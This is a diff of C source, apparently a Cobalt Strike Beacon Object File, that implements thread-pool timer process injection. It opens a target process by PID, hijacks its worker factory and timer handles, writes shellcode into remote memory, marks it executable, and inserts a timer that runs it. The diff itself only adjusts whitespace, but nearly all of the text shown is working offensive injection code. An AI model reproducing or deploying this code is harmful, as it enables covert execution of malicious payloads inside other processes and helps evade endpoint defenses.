@@ -3,7 +3,7 @@
 void RemoteTpTimerInsertion(HANDLE hTarget, LPVOID pShellcodeAddress) {
     _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
     _NtSetTimer2 NtSetTimer2 = (_NtSetTimer2)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetTimer2"));
-
+    
     WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation(hTpWorkerFactory);
     PFULL_TP_TIMER pTpTimer = (PFULL_TP_TIMER)KERNEL32$CreateThreadpoolTimer((PTP_TIMER_CALLBACK)(pShellcodeAddress), NULL, NULL);
     PFULL_TP_TIMER RemoteTpTimerAddress = (PFULL_TP_TIMER)(KERNEL32$VirtualAllocEx(hTarget, NULL, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
@@ -34,11 +34,11 @@ void RemoteTpTimerInsertion(HANDLE hTarget, LPVOID pShellcodeAddress) {
 
 void Inject8(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
     _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
-
+    
     HANDLE hTarget = NULL;
     DWORD dwOldProtect = NULL;
     hTarget = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwTargetProcessId);
-
+    
     if (hTarget) {
         HijackTpWorkerFactoryHandle(hTarget, WORKER_FACTORY_ALL_ACCESS);
         HijackIRTimerHandle(hTarget, TIMER_ALL_ACCESS);
@@ -46,7 +46,7 @@ void Inject8(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
         PVOID pShellcodeAddress = KERNEL32$VirtualAllocEx(hTarget, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         NtWriteVirtualMemory(hTarget, pShellcodeAddress, shellcode, shellcodeSize, NULL);
         KERNEL32$VirtualProtectEx(hTarget, pShellcodeAddress, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect);
-
+        
         RemoteTpTimerInsertion(hTarget, pShellcodeAddress);
     } else {
         BeaconPrintf(CALLBACK_OUTPUT, "PID %d inaccessible", dwTargetProcessId);
